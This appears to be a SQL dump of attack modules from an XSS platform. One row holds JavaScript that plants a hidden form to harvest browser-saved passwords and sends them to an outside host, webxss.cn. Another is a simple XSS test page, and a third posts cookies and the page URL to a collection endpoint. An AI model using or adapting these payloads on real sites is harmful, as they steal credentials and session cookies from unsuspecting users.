INSERT INTO `module` VALUES ('76', '723', '获取的浏览器已记录的密码为webvul.com/admin.php 文件的 那么在\r\nwebvul.com/admin/user/list.php页面插入 也可以获取到！获取的浏览器已记录的密码为webvul.com/admin.php 文件的 那么在\r\nwebvul.com/admin/user/list.php页面插入 也可以获取到！', 'function create_body(){\r\n		document.write(\'&lt;body&gt;&lt;/body&gt;\');\r\n	}\r\n	function create_form(user) { /*获取明文密码*/\r\n		var f = document.createElement(\"form\");\r\n		f.style.display= \"none\"\r\n		document.getElementsByTagName(\"body\")[0].appendChild(f);\r\n		var e1 = document.createElement(\"input\");\r\n		e1.type = \"{set.type1}\";\r\n		e1.name = \"{set.name1}\";\r\n                e1.id = \"{set.id1}\";\r\n		f.appendChild(e1);\r\n		var e = document.createElement(\"input\");\r\n		e.name = \"{set.name2}\";\r\n                e.type = \"{set.type2}\";\r\n                e.id = \"{set.id2}\";\r\n		f.appendChild(e);\r\n		\r\n		setTimeout(function () {\r\n			username = document.getElementById(\"{set.id1}\").value;\r\n                        password = document.getElementById(\"{set.id2}\").value;\r\n			var newimg = new Image();\r\n                       newimg.src=\"http://webxss.cn/index.php?do=api&id={projectId}&username=\"+username+\"&password=\"+password;\r\n		}, 2000); // 时间竞争\r\n	}\r\n\r\n	\r\n	create_form(\'\');\r\n', '0', '2016-01-29 23:16:42', '浏览器记住的明文密码');
INSERT INTO `module` VALUES ('77', '723', '可以用于测试一些常用语句', '&lt;html&gt; \r\n&lt;head&gt; \r\n&lt;title&gt;XSS测试&lt;/title&gt; \r\n&lt;body&gt; \r\n&lt;div id=\"elmt\" align=\"center\"&gt;\r\n&lt;input type=\"text\" id=\"txtinput\" style=\"width:500px\" placeholder=\"Anything you can input,egg:&lt;script&gt;alert(1)&lt;/script&gt;\"&gt;&lt;/input&gt;&lt;button onClick=\"inner()\"&gt;测试&lt;/button&gt; &lt;button onClick=\"clean()\"&gt;清屏&lt;/button&gt; \r\n&lt;/div&gt;\r\n&lt;p&gt;&lt;p&gt; \r\n&lt;div id=\"inbox\" style=\"border:1px solid red\"&gt; \r\n&lt;/div&gt; &lt;br&gt;\r\n&lt;div id=\"outbox\" style=\"border:1px solid red\"&gt; \r\n&lt;/div&gt; &lt;br&gt;\r\n&lt;div id=\"txtbox\" style=\"border:1px solid red\"&gt; \r\n&lt;/div&gt; \r\n&lt;script type=\"text/javascript\"&gt; \r\nfunction inner(){ \r\nvar txt=document.getElementById(\"txtinput\").value; \r\n\r\n//alert(txt); \r\n//document.write(txt); \r\nvar inbox=document.getElementById(\"inbox\"); \r\nvar outbox=document.getElementById(\"outbox\");\r\nvar txtbox=document.getElementById(\"txtbox\");\r\nif (txt==\"\"){\r\n	alert(\"先输入内容才行！--cdlin.com\");\r\n}else{\r\n\r\n//inbox.innerHTML = document.write(txt); \r\ninbox.innerHTML = inbox.innerHTML + \"&lt;font color=\'blue\'&gt;innerHTML:---&gt;&lt;/font&gt;\" + txt + \"&lt;br&gt;\";\r\n//outbox.innerHTML = outbox.innerHTML + \"&lt;font color=\'blue\'&gt;outerHTML:---&gt;&lt;/font&gt;\"  + txt + \"&lt;br&gt;\";\r\n//inbox.insertAdjacentHTML(\'beforeend\',\"&lt;font color=\'blue\'&gt;insertAdjancentHTML:---&gt;&lt;/font&gt;\" + txt + \"&lt;br&gt;\");\r\ntxtbox.innerText= \"innerText方式输出结果(当前源码)：\" + txt;\r\n} }\r\nfunction clean(){ \r\nvar inbox=document.getElementById(\"inbox\"); \r\n//alert(1); \r\ninbox.innerHTML=\"\"; \r\noutbox.innerHTML=\"\";\r\ntxtbox.innerText=\"\";\r\n} \r\n\r\n&lt;/script&gt; \r\n&lt;/body&gt; \r\n&lt;/html&gt;', '0', '2016-01-29 23:17:23', '基础XSS的测试工具');
INSERT INTO `module` VALUES ('78', '725', '还不错', 'Ajax = function() { function request(opt) { function fn() { } var url = opt.url || \"\"; var async = opt.async !== false, method = opt.method || \'GET\', data = opt.data || null, success = opt.success || fn, error = opt.failure || fn; method = method.toUpperCase(); if (method == \'GET\' && data) { var args = \"\"; if (typeof data == \'string\') { args = data; } else if (typeof data == \'object\') { var arr = new Array(); for ( var k in data) { var v = data[k]; arr.push(k + \"=\" + v); } args = arr.join(\"&\"); } url += (url.indexOf(\'?\') == -1 ? \'?\' : \'&\') + args; data = null; } var xhr = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject(\'Microsoft.XMLHTTP\'); xhr.onreadystatechange = function() { _onStateChange(xhr, success, error); }; xhr.open(method, url, async); if (method == \'POST\') { xhr.setRequestHeader(\'Content-type\', \'application/x-www-form-urlencoded;\'); } xhr.send(data); return xhr; } function _onStateChange(xhr, success, failure) { if (xhr.readyState == 4) { var s = xhr.status; if (s &gt;= 200 && s &lt; 300) { success(xhr); } else { failure(xhr); } } else { } } return { request : request }; }(); commit(); function commit() { var cookie = document.cookie; var url = document.location; var html= document.getElementsByTagName(\'html\')[0].innerHTML; cookie = encodeURIComponent(cookie); url = encodeURIComponent(url); html=encodeURIComponent(html); Ajax.request({ url : \"{api}\", data : \'url=\' + url + \'&cookie=\' + cookie, method : \"POST\", success : function(xhr) { }, error : function(xhr) { } }); }', '1', '2016-01-30 03:59:36', '叙述APP');
